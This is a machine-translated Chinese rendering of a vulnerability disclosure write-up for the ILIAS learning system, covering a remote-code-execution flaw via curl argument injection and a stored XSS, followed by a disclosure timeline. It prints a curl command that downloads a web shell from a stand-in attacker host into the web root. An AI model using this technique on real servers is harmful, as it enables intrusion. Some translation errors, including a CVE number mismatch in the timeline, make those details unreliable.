<html>
<head>
<title>Exploiting ILIAS learning management system</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">开发ILIAS学习管理系统</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-ilias-learning-management-system-4eda9e120620?source=collection_archive---------3-----------------------#2020-11-03">https://infosecwriteups.com/exploiting-ilias-learning-management-system-4eda9e120620?source=collection_archive---------3-----------------------#2020-11-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/7b9a4ba8cacbe1eccf9f97bf41cf2841.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gDJF4Sh501ycPWaQ.png"/></div></div></figure><p id="0827" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在一个寂寞的周六晚上，我感到很无聊，所以我随便挑了一些申请看看。这个应用程序是ILIAS学习管理系统。</p><p id="51c4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">CVE-2020–25268-认证远程代码执行<br/>CVE-2020–25267-认证存储跨站点脚本</p><h1 id="2fab" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">CVE-2020–25268</h1><p id="de9d" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">这是发现的最严重的漏洞，它将允许具有低权限的已验证用户获得代码执行。</p><p id="7581" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">导航到个人-&gt;概览后，ILIAS允许您添加外部网络订阅源</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lz"><img src="../Images/6198989a845645d702346aeb225a2d1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fGWUC3MekNAXF1fpKe7PuA.png"/></div></div></figure><p id="f8fa" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当你发送一个请求时，它在你的服务器上看起来像这样</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi me"><img src="../Images/5fbc447b263108013aad224436a3901e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h1fr3B73gAsPIEZfVSPr6g.png"/></div></div></figure><p id="5fbe" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">嗯，我想知道0.72是多少。在对漏洞进行快速搜索后，它显示了一堆XSS漏洞，然而没有运气真正利用它们，因为ILIAS html渲染是正确安全的。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mf"><img src="../Images/61e068c1ca270fc6ad7d1aba898b31a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GeAGrUKzr7zdHjTDjH7UuQ.png"/></div></div></figure><p id="fe1d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">深入研究一下源代码，我发现magpie使用的是一个名为snoopy.class.inc的库，其中on _httpsrequest函数通过exec调用curl。我心想，该死的这个图书馆一定很古老(的确如此)。</p><p id="b888" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">查看第656行，您可以看到下面的代码</p><pre class="ma mb mc md gt mg mh mi mj aw mk bi"><span id="7099" class="ml kx iq mh b gy mm mn l mo mp">exec($this-&gt;curl_path.” -D \”/tmp/$headerfile\””.escapeshellcmd($cmdline_params).” “.escapeshellcmd($URI),$results,$return);</span></pre><p id="852f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">escapeshellcmd将是很好的保护，如果你试图注入像“；whoamihostname”命令，但是它不能保护实际的二进制文件是否会被滥用。在这种情况下，curl允许用一个命令远程获取文件。</p><p id="5c1d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">卷发<a class="ae mq" href="https://maliciousactor.com/shell.php" rel="noopener ugc nofollow" target="_blank">https://maliciousactor.com/shell.php</a>-o/var/www/html/shell . PHP</p><p id="4b31" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因此，如果您以下面的方式运行该命令，您就可以在web服务器上上传您的恶意外壳。理想情况下，如果您知道允许写权限的路径。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mr"><img src="../Images/da16fc4cdf36c8569e6a6bf6531d1cc8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*S1tzspVWtxZxpnqIN3XtEQ.png"/></div></div></figure><p id="09ae" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">即使在POC中看不到“Add New Webfeed ”,此功能也可以工作，但是您必须知道/枚举Cmdnode参数。</p><div class="ms mt gp gr mu mv"><a href="https://github.com/ILIAS-eLearning/ILIAS/commit/fa10f165476c449efba6d8a3b5a55df77146e96a" rel="noopener  ugc nofollow" target="_blank"><div class="mw ab fo"><div class="mx ab my cl cj mz"><h2 class="bd ir gy z fp na fr fs nb fu fw ip bi translated">修复了错误# 28867 ILIAS-eLearning/ILIAS @ fa10f 16</h2><div class="nc l"><h3 class="bd b gy z fp na fr fs nb fu fw dk translated">此时您不能执行该操作。您已使用另一个标签页或窗口登录。您已在另一个选项卡中注销，或者…</h3></div><div class="nd l"><p class="bd b dl z fp na fr fs nb fu fw dk translated">github.com</p></div></div><div class="ne l"><div class="nf l ng nh ni ne nj jw mv"/></div></div></a></div><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="nk nl l"/></div><figcaption class="nm nn gj gh gi no np bd b be z dk translated">在ILIAS上执行认证代码</figcaption></figure><h1 id="4010" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">CVE-2020年至25267年</h1><p id="007e" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">这是一个低优先级类型的漏洞，允许攻击者存储XSS，但是要真正利用这一点，您需要中级权限来创建问题池。</p><p id="f4e2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">问题池允许文件上传，但是有适当的限制，不允许任何PHP和其他类型的文件。经过仔细观察，我注意到您可以为文件添加HTML扩展名。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nq"><img src="../Images/4bbb535eb72cefca15e67e2584951f05.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YR5H4Ttk55tUYjqhTF93fg.png"/></div></div></figure><p id="b7e9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">之后，您需要运行池，上传包含有效负载的html文件，并在预览中打开它。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nr"><img src="../Images/4858a0b5aa9fa23beac9a389a0496837.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tx4rN8GdWxj-dJYrK5hi4g.png"/></div></div></figure><p id="a169" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae mq" href="https://www.youtube.com/watch?v=wI5UlOXunl0&amp;feature=youtu.be" rel="noopener ugc nofollow" target="_blank">https://www.youtube.com/watch?v=wI5UlOXunl0&amp;feature = youtu . be</a></p><h1 id="161e" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">顶部的樱桃——未经认证的反射XSS</h1><p id="5a96" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">这个漏洞最初不是由我发现的，所以我不会因此而居功，但是有时做一个简单的谷歌搜索仍然会返回有效的和可利用的漏洞</p><p id="6d69" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae mq" href="https://www.openbugbounty.org/reports/70516/" rel="noopener ugc nofollow" target="_blank">https://www.openbugbounty.org/reports/70516/</a></p><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="nk nl l"/></div></figure><h1 id="3dc1" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">披露时间表</h1><p id="de56" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">2020年6月9日—报告了该问题</p><p id="affc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">2020年10月9日—为修复而创建的票证</p><p id="a3bc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">17/09/2020—代码执行漏洞已解决(CVE-2020–25267)，并已验证为已修复</p><p id="8c7c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">2020年10月23日—发布了包含修复程序的ILIAS 6.5和5.4.18</p></div></div>    
</body>
</html>